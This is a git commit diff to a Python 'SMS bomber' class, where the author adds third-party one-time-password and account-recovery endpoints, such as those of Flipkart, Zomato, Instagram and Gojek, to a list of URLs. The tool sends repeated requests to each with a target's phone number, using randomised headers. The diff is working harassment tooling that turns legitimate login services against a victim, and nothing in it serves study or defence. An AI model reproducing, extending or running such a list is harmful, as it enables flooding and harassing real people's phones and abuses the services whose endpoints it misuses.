6a24ca1388f602451faab777a97b8335d78a4a60
vili <me@vili.dev>
2023-08-11 23:22:17 +0300

    Added more urls to sms bomber

--- utils/smsbomber.py
+++ utils/smsbomber.py
@@ -35,10 +35,17 @@ class SMSBomber:
         self.count = int(count)
         self.throttle = int(throttle)
         self.urls = [
-            f"https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20{number}",
-            f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone={number}",
-            f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={number}",
-            f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={number}"
+            f"https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20{self.number}",
+            f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone={self.number}",
+            f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={self.number}",
+            f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={self.number}",
+            f"https://www.flipkart.com/api/6/user/signup/status?phone={self.number}",
+            f"https://www.hike.in/v1/account/auth/2.0/otp/send?msisdn={self.number}",
+            f"https://www.instagram.com/accounts/account_recovery_send_ajax/?email_or_username={self.number}&recaptcha_challenge_field=",
+            f"https://www.zomato.com/php/o2_send.php?phone={self.number}",
+            f"https://api.dunzo.in/api/v1/users/send_login_otp?phone={self.number}",
+            f"https://auth.gojekapi.com/v2/customer/otp?phone_number=%2B{self.number}",
+            f"https://www.olx.com.lb/api/auth/authenticate/byPhone?phone={self.number}"
         ]
         self.session = requests.session()
         self.session.headers = random.choice(users)
